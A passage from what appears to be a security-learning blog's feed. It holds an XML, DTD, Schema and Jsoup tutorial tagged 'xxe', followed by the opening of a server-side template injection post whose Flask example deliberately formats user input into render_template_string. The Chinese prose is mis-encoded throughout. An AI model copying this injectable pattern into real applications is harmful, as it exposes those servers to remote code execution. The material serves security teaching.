class="line">.</span><br><span class="line">.</span><br><span class="line"><span class="tag">&lt;/<span class="name">CATALOG</span>&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>ä½¿ç”¨ CSS æ ¼å¼åŒ– XML ä¸æ˜¯å¸¸ç”¨çš„æ–¹æ³•ï¼Œæ›´ä¸èƒ½ä»£è¡¨ XML æ–‡æ¡£æ ·å¼åŒ–çš„æœªæ¥ã€‚W3C æ¨èä½¿ç”¨ XSLT</p></blockquote><h2 id="XML-XSLT"><a href="#XML-XSLT" class="headerlink" title="XML XSLT"></a>XML XSLT</h2><p>XSLT æ˜¯é¦–é€‰çš„ XML æ ·å¼è¡¨è¯­è¨€ã€‚</p><p>XSLT (eXtensible Stylesheet Language Transformations) è¿œæ¯” CSS æ›´åŠ å®Œå–„ã€‚</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=<span class="string">&quot;text/xsl&quot;</span> href=<span class="string">&quot;simple.xsl&quot;</span>?&gt;</span> <span class="comment">&lt;!--æŠŠè¿™ä¸ªXMLæ–‡ä»¶é“¾æ¥åˆ°XSLæ–‡ä»¶--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">breakfast_menu</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">food</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Belgian Waffles<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>$5.95<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span></span><br><span class="line">       two of our famous Belgian Waffles</span><br><span class="line">    <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">calories</span>&gt;</span>650<span class="tag">&lt;/<span class="name">calories</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">food</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">breakfast_menu</span>&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>åœ¨ä½¿ç”¨ XSLT æ¥è½¬æ¢ XML æ—¶ï¼Œä¸åŒçš„æµè§ˆå™¨å¯èƒ½ä¼šäº§ç”Ÿä¸åŒç»“æœã€‚ä¸ºäº†å‡å°‘è¿™ç§é—®é¢˜ï¼Œå¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šè¿›è¡Œ XSLT è½¬æ¢ã€‚</p></blockquote><p>DOM å°† XML æ–‡æ¡£ä½œä¸ºä¸€ä¸ªæ ‘å½¢ç»“æ„ï¼Œè€Œæ ‘å¶è¢«å®šä¹‰ä¸º<strong>èŠ‚ç‚¹</strong></p><p>ä»¥ä¹¦åº—æ–‡æ¡£ä¸ºä¾‹</p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24egy1h1o9tjk5xoj20l60bejs6.jpg"                      alt="image-20220427143813504" style="zoom: 50%;"                 ><figcaption>image-20220427143813504</figcaption></figure><h2 id="XMLçº¦æŸ"><a href="#XMLçº¦æŸ" class="headerlink" title="XMLçº¦æŸ"></a>XMLçº¦æŸ</h2><ul><li><p>çº¦æŸï¼šè§„å®šxmlæ–‡æ¡£çš„ä¹¦å†™è§„åˆ™</p><ul><li><p>ä½œä¸ºæ¡†æ¶çš„ä½¿ç”¨è€…(ç¨‹åºå‘˜)ï¼š</p><ol><li>èƒ½å¤Ÿåœ¨xmlä¸­å¼•å…¥çº¦æŸæ–‡æ¡£</li><li>èƒ½å¤Ÿç®€å•çš„è¯»æ‡‚çº¦æŸæ–‡æ¡£</li></ol></li><li><p>åˆ†ç±»ï¼š</p><ol><li>DTD:ä¸€ç§ç®€å•çš„çº¦æŸæŠ€æœ¯</li><li>Schema:ä¸€ç§å¤æ‚çš„çº¦æŸæŠ€æœ¯</li></ol></li></ul></li></ul><h3 id="DTDï¼š"><a href="#DTDï¼š" class="headerlink" title="DTDï¼š"></a>DTDï¼š</h3><ul><li>å¼•å…¥dtdæ–‡æ¡£åˆ°xmlæ–‡æ¡£ä¸­<ul><li>å†…éƒ¨dtdï¼šå°†çº¦æŸè§„åˆ™å®šä¹‰åœ¨xmlæ–‡æ¡£ä¸­</li><li>å¤–éƒ¨dtdï¼šå°†çº¦æŸçš„è§„åˆ™å®šä¹‰åœ¨å¤–éƒ¨çš„dtdæ–‡ä»¶ä¸­<ul><li>æœ¬åœ°ï¼š<!DOCTYPE æ ¹æ ‡ç­¾å SYSTEM "dtdæ–‡ä»¶çš„ä½ç½®"></li><li>ç½‘ç»œï¼š<!DOCTYPE æ ¹æ ‡ç­¾å PUBLIC "dtdæ–‡ä»¶åå­—" "dtdæ–‡ä»¶çš„ä½ç½®URL"></li></ul></li></ul></li></ul><h3 id="Schema"><a href="#Schema" class="headerlink" title="Schema:"></a>Schema:</h3><p>å¯ä»¥è‡ªå®šä¹‰ç±»å‹ï¼Œç»™æ ‡ç­¾å†…å®¹æ›´å¤šçš„è§„å®š</p><ul><li>å¼•å…¥ï¼š<ol><li>å¡«å†™xmlæ–‡æ¡£çš„æ ¹å…ƒç´ </li><li>å¼•å…¥xsiå‘½åç©ºé—´(xsiæ ‡å‡†å‘½åç©ºé—´ï¼Œæœ‰å¤šç§å–å€¼ åˆ†åˆ«å¯¹åº”ä¸åŒç‰ˆæœ¬).  xmlns:xsi&#x3D;â€<a class="link"   href="http://www.w3.org/2001/XMLSchema-instance" >http://www.w3.org/2001/XMLSchema-instance <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>â€œ</li><li>ä¸ºæ¯ä¸ªå‘½åç©ºé—´æŒ‡å®šå…·ä½“çš„schemaæ–‡ä»¶ ä¸¤ä¸¤ä¸€å¯¹  <code>xsi:schemaLocation=&quot;http://www.itcast.cn/xml student.xsd&quot;</code> </li><li>ä¸ºæ¯ä¸€ä¸ªxsdçº¦æŸå£°æ˜ä¸€ä¸ªå‰ç¼€,ä½œä¸ºæ ‡è¯†  xmlns&#x3D;â€<a class="link"   href="http://www.itcast.cn/xml" >http://www.itcast.cn/xml <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>â€œ (xmlnså®šä¹‰é»˜è®¤å‘½åç©ºé—´ï¼Œåªå¼•ä¸€ä¸ªçº¦æŸæ–‡æ¡£æ—¶ï¼Œå¯ä»¥ä¸åŠ å‰ç¼€ï¼Œä¸ºç©ºå‰ç¼€ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨æ ‡ç­¾ï¼Œé»˜è®¤æ‰€æœ‰æ ‡ç­¾éƒ½ç”¨è¿™ä¸ªæ–‡æ¡£)<ul><li>åŠ å‰ç¼€ç‰ˆ(è‡ªå®šä¹‰å‘½åç©ºé—´ï¼Œç»™å‘½åç©ºé—´å–åˆ«åï¼Œå…¶èµ‹å€¼å¿…é¡»æ˜¯ä¸ªå‘½åç©ºé—´æ–‡ä»¶ å¿…é¡»åœ¨xsiå‘½åç©ºé—´å†…æŒ‡å®šå…¶å¯¹åº”çš„schemaæ–‡ä»¶)ï¼šxmlns:a&#x3D;â€<a class="link"   href="http://www.itcast.cn/xml1" >http://www.itcast.cn/xml1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>â€œ  ä½¿ç”¨è¯¥çº¦æŸæ–‡æ¡£çš„æ ‡ç­¾éƒ½è¦åŠ å‰ç¼€ å¦‚<code>&lt;a:age&gt;&lt;/a:age&gt;</code></li></ul></li></ol></li></ul><blockquote><p>æ ¹æ ‡ç­¾å†…å¼•å…¥</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">students</span>   <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns</span>=<span class="string">&quot;http://www.itcast.cn/xml&quot;</span> </span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.itcast.cn/xml  student.xsd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div></blockquote><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24ely1h4lrp1a2m5j21ho0q6n3h.jpg"                      alt="image-20220727204100444"                ><figcaption>image-20220727204100444</figcaption></figure></p><h2 id="XMLè§£æ"><a href="#XMLè§£æ" class="headerlink" title="XMLè§£æ"></a>XMLè§£æ</h2><p>è§£æï¼šæ“ä½œxmlæ–‡æ¡£ï¼Œå°†æ–‡æ¡£ä¸­çš„æ•°æ®è¯»å–åˆ°å†…å­˜ä¸­</p><ul><li><p>æ“ä½œxmlæ–‡æ¡£</p><ol><li>è§£æ(è¯»å–)ï¼šå°†æ–‡æ¡£ä¸­çš„æ•°æ®è¯»å–åˆ°å†…å­˜ä¸­</li><li>å†™å…¥ï¼šå°†å†…å­˜ä¸­çš„æ•°æ®ä¿å­˜åˆ°xmlæ–‡æ¡£ä¸­ã€‚æŒä¹…åŒ–çš„å­˜å‚¨</li></ol></li><li><p>è§£æxmlçš„æ–¹å¼ï¼š</p><ol><li>DOMï¼šå°†æ ‡è®°è¯­è¨€æ–‡æ¡£ä¸€æ¬¡æ€§åŠ è½½è¿›å†…å­˜ï¼Œåœ¨å†…å­˜ä¸­å½¢æˆä¸€é¢—domæ ‘</li></ol><p>  <figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24ely1h4lrrg091cj20mw0fcq3p.jpg"                      alt="image-20220727204321916"                ><figcaption>image-20220727204321916</figcaption></figure></p><ul><li>ä¼˜ç‚¹ï¼šæ“ä½œæ–¹ä¾¿ï¼Œå¯ä»¥å¯¹æ–‡æ¡£è¿›è¡ŒCRUDçš„æ‰€æœ‰æ“ä½œ</li><li>ç¼ºç‚¹ï¼šå å†…å­˜</li></ul><ol start="2"><li>SAXï¼šé€è¡Œè¯»å–(è‡ªåŠ¨é‡Šæ”¾ä¸Šä¸€è¡Œ)ï¼ŒåŸºäºäº‹ä»¶é©±åŠ¨çš„ã€‚</li></ol><ul><li>ä¼˜ç‚¹ï¼šä¸å å†…å­˜ã€‚</li><li>ç¼ºç‚¹ï¼šåªèƒ½è¯»å–ï¼Œä¸èƒ½å¢åˆ æ”¹</li></ul></li></ul><h3 id="xmlå¸¸è§çš„è§£æå™¨ï¼š"><a href="#xmlå¸¸è§çš„è§£æå™¨ï¼š" class="headerlink" title="xmlå¸¸è§çš„è§£æå™¨ï¼š"></a>xmlå¸¸è§çš„è§£æå™¨ï¼š</h3><p>â€‹1. JAXPï¼šsunå…¬å¸æä¾›çš„è§£æå™¨ï¼Œæ”¯æŒdomå’Œsaxä¸¤ç§æ€æƒ³<br>â€‹2. DOM4Jï¼šä¸€æ¬¾éå¸¸ä¼˜ç§€çš„è§£æå™¨<br>â€‹3. Jsoupï¼šjsoup æ˜¯ä¸€æ¬¾Java çš„HTMLè§£æå™¨ï¼Œå¯ç›´æ¥è§£ææŸä¸ªURLåœ°å€ã€HTMLæ–‡æœ¬å†…å®¹ã€‚å®ƒæä¾›äº†ä¸€å¥—éå¸¸çœåŠ›çš„APIï¼Œå¯é€šè¿‡DOMï¼ŒCSSä»¥åŠç±»ä¼¼äºjQueryçš„æ“ä½œæ–¹æ³•æ¥å–å‡ºå’Œæ“ä½œæ•°æ®ã€‚<br>â€‹4. PULLï¼šAndroidæ“ä½œç³»ç»Ÿå†…ç½®çš„è§£æå™¨ï¼Œsaxæ–¹å¼çš„ã€‚</p><h3 id="Jsoup"><a href="#Jsoup" class="headerlink" title="Jsoup"></a>Jsoup</h3><p>jsoup æ˜¯ä¸€æ¬¾Java çš„HTMLè§£æå™¨ï¼Œå¯ç›´æ¥è§£ææŸä¸ªURLåœ°å€ã€HTMLæ–‡æœ¬å†…å®¹ã€‚å®ƒæä¾›äº†ä¸€å¥—éå¸¸çœåŠ›çš„APIï¼Œå¯é€šè¿‡DOMï¼ŒCSSä»¥åŠç±»ä¼¼äºjQueryçš„æ“ä½œæ–¹æ³•æ¥å–å‡ºå’Œæ“ä½œæ•°æ®ã€‚</p><ul><li><p>å¿«é€Ÿå…¥é—¨ï¼š</p><ul><li>æ­¥éª¤ï¼š<ol><li>å¯¼å…¥jaråŒ…</li><li>è·å–Documentå¯¹è±¡</li><li>è·å–å¯¹åº”çš„æ ‡ç­¾Elementå¯¹è±¡</li><li>è·å–æ•°æ®</li></ol></li></ul></li><li><p>ä»£ç ï¼š</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è·å–Documentå¯¹è±¡,æ ¹æ®xmlæ–‡æ¡£è·å–</span></span><br><span class="line"><span class="comment">//è·å–student.xmlçš„path</span></span><br><span class="line">String path= JsoupDemo1.class.getClassLoader().getResource(<span class="string">&quot;student.xml&quot;</span>).toURI().getPath();</span><br><span class="line"><span class="comment">//è§£æxmlæ–‡æ¡£ï¼ŒåŠ è½½æ–‡æ¡£è¿›å†…å­˜ï¼Œè·å–domæ ‘--&gt;Document</span></span><br><span class="line"><span class="type">Document</span> <span class="variable">document</span> <span class="operator">=</span> Jsoup.parse(<span class="keyword">new</span> <span class="title class_">File</span>(path), <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"><span class="comment">//è·å–å…ƒç´ å¯¹è±¡ Element</span></span><br><span class="line"><span class="type">Elements</span> <span class="variable">elements</span> <span class="operator">=</span> document.getElementsByTag(<span class="string">&quot;name&quot;</span>);<span class="comment">//Elementsæ˜¯ArrayList&lt;Element&gt;</span></span><br><span class="line">System.out.println(elements.size());</span><br><span class="line"><span class="comment">//è·å–ç¬¬ä¸€ä¸ªnameçš„Elementå¯¹è±¡</span></span><br><span class="line"><span class="type">Element</span> <span class="variable">element</span> <span class="operator">=</span> elements.get(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//è·å–æ•°æ®</span></span><br><span class="line"><span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> element.text();</span><br><span class="line">System.out.println(text);</span><br></pre></td></tr></table></figure></div><blockquote><p>è·¯å¾„ä¸­æœ‰ä¸­æ–‡æˆ–ç©ºæ ¼æ—¶ï¼Œè¦å…ˆtoURIå†getPath</p></blockquote></li><li><p>å¯¹è±¡çš„ä½¿ç”¨ï¼š</p><ol><li>Jsoupï¼šå·¥å…·ç±»ï¼Œå¯ä»¥è§£æhtmlæˆ–xmlæ–‡æ¡£ï¼Œè¿”å›Document<ul><li>parseï¼šè§£æhtmlæˆ–xmlæ–‡æ¡£ï¼Œè¿”å›Document<ul><li>parse(File in, String charsetName)ï¼šè§£æxmlæˆ–htmlæ–‡ä»¶çš„ã€‚</li><li>parse(String html)ï¼šè§£æxmlæˆ–htmlå­—ç¬¦ä¸²</li><li>parse(URL url, int timeoutMillis)ï¼šé€šè¿‡ç½‘ç»œè·¯å¾„è·å–æŒ‡å®šçš„htmlæˆ–xmlçš„æ–‡æ¡£å¯¹è±¡</li></ul></li></ul></li><li>Documentï¼šæ–‡æ¡£å¯¹è±¡ã€‚ä»£è¡¨å†…å­˜ä¸­çš„domæ ‘<ul><li>è·å–Elementå¯¹è±¡<ul><li>getElementById(String id)ï¼šæ ¹æ®idå±æ€§å€¼è·å–å”¯ä¸€çš„elementå¯¹è±¡</li><li>getElementsByTag(String tagName)ï¼šæ ¹æ®æ ‡ç­¾åç§°è·å–å…ƒç´ å¯¹è±¡é›†åˆ</li><li>getElementsByAttribute(String key)ï¼šæ ¹æ®å±æ€§åç§°è·å–å…ƒç´ å¯¹è±¡é›†åˆ</li><li>getElementsByAttributeValue(String key, String value)ï¼šæ ¹æ®å¯¹åº”çš„å±æ€§åå’Œå±æ€§å€¼è·å–å…ƒç´ å¯¹è±¡é›†åˆ</li></ul></li></ul></li><li>Elementsï¼šå…ƒç´ Elementå¯¹è±¡çš„é›†åˆã€‚å¯ä»¥å½“åš ArrayList<Element>æ¥ä½¿ç”¨</li><li>Elementï¼šå…ƒç´ å¯¹è±¡<ol><li><p>è·å–å­å…ƒç´ å¯¹è±¡</p><ul><li>getElementById(String id)ï¼šæ ¹æ®idå±æ€§å€¼è·å–å”¯ä¸€çš„elementå¯¹è±¡</li><li>getElementsByTag(String tagName)ï¼šæ ¹æ®æ ‡ç­¾åç§°è·å–å…ƒç´ å¯¹è±¡é›†åˆ</li><li>getElementsByAttribute(String key)ï¼šæ ¹æ®å±æ€§åç§°è·å–å…ƒç´ å¯¹è±¡é›†åˆ</li><li>getElementsByAttributeValue(String key, String value)ï¼šæ ¹æ®å¯¹åº”çš„å±æ€§åå’Œå±æ€§å€¼è·å–å…ƒç´ å¯¹è±¡é›†åˆ</li></ul></li><li><p>è·å–å±æ€§å€¼</p><ul><li>String attr(String key)ï¼šæ ¹æ®å±æ€§åç§°(å¤§å°å†™ä¸æ•æ„Ÿ)è·å–å±æ€§å€¼</li></ul></li><li><p>è·å–æ–‡æœ¬å†…å®¹</p><ul><li>String text():è·å–æ–‡æœ¬å†…å®¹ï¼ˆæ‰€æœ‰å­æ ‡ç­¾çš„çº¯æ–‡æœ¬å†…å®¹æ‹¼æ¥ï¼Œä¸åŒ…å«æ ‡ç­¾ååŠ&lt;&gt;ï¼‰</li><li>String html():è·å–æ ‡ç­¾ä½“çš„æ‰€æœ‰å†…å®¹(åŒ…æ‹¬å­æ ‡ç­¾çš„å­—ç¬¦ä¸²å†…å®¹,åŒ…å«æ ‡ç­¾ååŠ&lt;&gt;)</li></ul></li></ol></li><li>Nodeï¼šèŠ‚ç‚¹å¯¹è±¡<ul><li>æ˜¯Documentå’ŒElementçš„çˆ¶ç±»</li></ul></li></ol></li></ul><ul><li><p>å¿«æ·æŸ¥è¯¢æ–¹å¼ï¼š</p><ol><li><p>selector:é€‰æ‹©å™¨</p><ul><li><p>ä½¿ç”¨çš„æ–¹æ³•ï¼šElementsselect(String cssQuery) </p><ul><li>è¯­æ³•ï¼šå‚è€ƒSelectorç±»ä¸­å®šä¹‰çš„è¯­æ³•</li></ul><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//é€‰æ‹©å™¨æŸ¥è¯¢</span></span><br><span class="line"><span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> JsoupDemo1.class.getClassLoader().getResource(<span class="string">&quot;student.xml&quot;</span>).toURI().getPath();</span><br><span class="line"><span class="type">Document</span> <span class="variable">document</span> <span class="operator">=</span> Jsoup.parse(<span class="keyword">new</span> <span class="title class_">File</span>(path), <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"><span class="comment">//è·å–nameæ ‡ç­¾</span></span><br><span class="line"><span class="type">Elements</span> <span class="variable">elements</span> <span class="operator">=</span> document.select(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">System.out.println(elements);</span><br><span class="line"><span class="comment">//è·å–id=&quot;itcast&quot;çš„å…ƒç´ </span></span><br><span class="line"><span class="type">Elements</span> <span class="variable">elements1</span> <span class="operator">=</span> document.select(<span class="string">&quot;#itcast&quot;</span>);</span><br><span class="line">System.out.println(elements1);</span><br><span class="line">System.out.println(<span class="string">&quot;-------&quot;</span>);</span><br><span class="line"><span class="comment">//è·å–studentæ ‡ç­¾ä¸‹number=&quot;heima_0001çš„ageå­æ ‡ç­¾</span></span><br><span class="line"><span class="type">Elements</span> <span class="variable">elements2</span> <span class="operator">=</span> document.select(<span class="string">&quot;student[number=&#x27;heima_0001&#x27;]&quot;</span>);</span><br><span class="line">System.out.println(elements2);</span><br><span class="line"><span class="type">Elements</span> <span class="variable">elements3</span> <span class="operator">=</span> document.select(<span class="string">&quot;student[number=&#x27;heima_0001&#x27;] &gt; age&quot;</span>);</span><br><span class="line"><span class="comment">//å¾—åˆ°age</span></span><br><span class="line">System.out.println(elements3);</span><br></pre></td></tr></table></figure></div></li></ul></li><li><p>XPathï¼šXPathå³ä¸ºXMLè·¯å¾„è¯­è¨€ï¼Œå®ƒæ˜¯ä¸€ç§ç”¨æ¥ç¡®å®šXMLï¼ˆæ ‡å‡†é€šç”¨æ ‡è®°è¯­è¨€çš„å­é›†ï¼‰æ–‡æ¡£ä¸­æŸéƒ¨åˆ†ä½ç½®çš„è¯­è¨€</p><ul><li>ä½¿ç”¨Jsoupçš„Xpathéœ€è¦é¢å¤–å¯¼å…¥jaråŒ…ã€‚</li><li>æŸ¥è¯¢w3cshoolå‚è€ƒæ‰‹å†Œï¼Œä½¿ç”¨xpathçš„è¯­æ³•å®ŒæˆæŸ¥è¯¢</li><li>ä»£ç ï¼š</li></ul><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> JsoupDemo1.class.getClassLoader().getResource(<span class="string">&quot;student.xml&quot;</span>).toURI().getPath();</span><br><span class="line"><span class="type">Document</span> <span class="variable">document</span> <span class="operator">=</span> Jsoup.parse(<span class="keyword">new</span> <span class="title class_">File</span>(path), <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"><span class="comment">//æ ¹æ®documentå¯¹è±¡ï¼Œåˆ›å»ºJXDocumentå¯¹è±¡</span></span><br><span class="line">JXDocument jxDocument=<span class="keyword">new</span> <span class="title class_">JXDocument</span>(document);</span><br><span class="line"><span class="comment">//ç»“åˆXpathè¯­æ³•æŸ¥è¯¢</span></span><br><span class="line">List&lt;JXNode&gt; jxNodes = jxDocument.selN(<span class="string">&quot;//student&quot;</span>); <span class="comment">// &#x27;//&#x27;è¡¨ç¤ºå½“å‰èŠ‚ç‚¹</span></span><br><span class="line"><span class="keyword">for</span> (JXNode jxNode: jxNodes) &#123;</span><br><span class="line">    System.out.println(jxNode);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æŸ¥è¯¢æ‰€æœ‰studentæ ‡ç­¾ä¸‹çš„nameæ ‡ç­¾</span></span><br><span class="line">List&lt;JXNode&gt; jxNodes1 = jxDocument.selN(<span class="string">&quot;//student/name&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (JXNode j: jxNodes1) &#123;</span><br><span class="line">    System.out.println(j);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æŸ¥è¯¢studentæ ‡ç­¾ä¸‹å¸¦æœ‰idå±æ€§çš„nameæ ‡ç­¾</span></span><br><span class="line">List&lt;JXNode&gt; jxNodes3 = jxDocument.selN(<span class="string">&quot;//student/name[@id]&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (JXNode jxNode : jxNodes3) &#123;</span><br><span class="line">    System.out.println(jxNode);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æŸ¥è¯¢studentæ ‡ç­¾ä¸‹å¸¦æœ‰idå±æ€§çš„nameæ ‡ç­¾ å¹¶ä¸”idå±æ€§å€¼ä¸ºitcast</span></span><br><span class="line">List&lt;JXNode&gt; jxNodes4 = jxDocument.selN(<span class="string">&quot;//student/name[@id=&#x27;itcast&#x27;]&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (JXNode jxNode : jxNodes4) &#123;</span><br><span class="line">    System.out.println(jxNode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol></li></ul>]]></content>
      
      
      <categories>
          
          <category> foundation </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTIåŸç†å­¦ä¹ </title>
      <link href="/2022/04/03/SSTI%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/04/03/SSTI%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="SSTIåŸç†å­¦ä¹ "><a href="#SSTIåŸç†å­¦ä¹ " class="headerlink" title="SSTIåŸç†å­¦ä¹ "></a><strong>SSTIåŸç†å­¦ä¹ </strong></h1><h2 id="Flaskæ¡†æ¶"><a href="#Flaskæ¡†æ¶" class="headerlink" title="Flaskæ¡†æ¶"></a>Flaskæ¡†æ¶</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)  </span><br><span class="line"><span class="comment"># appæ˜¯Flaskçš„å®ä¾‹ï¼Œå®ƒæ¥æ”¶åŒ…æˆ–è€…æ¨¡å—çš„åå­—ä½œä¸ºå‚æ•°ï¼Œä½†ä¸€èˆ¬éƒ½æ˜¯ä¼ é€’__name__</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test/&#x27;</span></span>)  </span><span class="comment"># åœ¨è¿è¡Œå®ä½“ä¸Šç»‘å®šURLè·¯ç”±</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    html = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> % code</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># è¿è¡ŒFlashå®ä½“ï¼Œå¦‚æœè¦è®©ç½‘ç»œä¸Šçš„äººä¹Ÿå¯ä»¥è®¿é—®ï¼Œè¿è¡Œapp.run(host=â€™0.0.0.0â€™)</span></span><br><span class="line"><span class="comment"># Flaskç±»åªæœ‰ä¸€ä¸ªå¿…é¡»æŒ‡å®šçš„å‚æ•°ï¼Œå³ç¨‹åºä¸»æ¨¡å—æˆ–è€…åŒ…çš„åå­—ï¼Œ__name__æ˜¯ç³»ç»Ÿå˜é‡ï¼Œè¯¥å˜é‡æŒ‡çš„æ˜¯æœ¬pyæ–‡ä»¶çš„æ–‡ä»¶å</span></span><br></pre></td></tr></table></figure></div><h2 id="å¸¸ç”¨é­”æœ¯æ–¹æ³•"><a href="#å¸¸ç”¨é­”æœ¯æ–¹æ³•" class="headerlink" title="å¸¸ç”¨é­”æœ¯æ–¹æ³•"></a>å¸¸ç”¨é­”æœ¯æ–¹æ³•</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__class__            <span class="comment"># 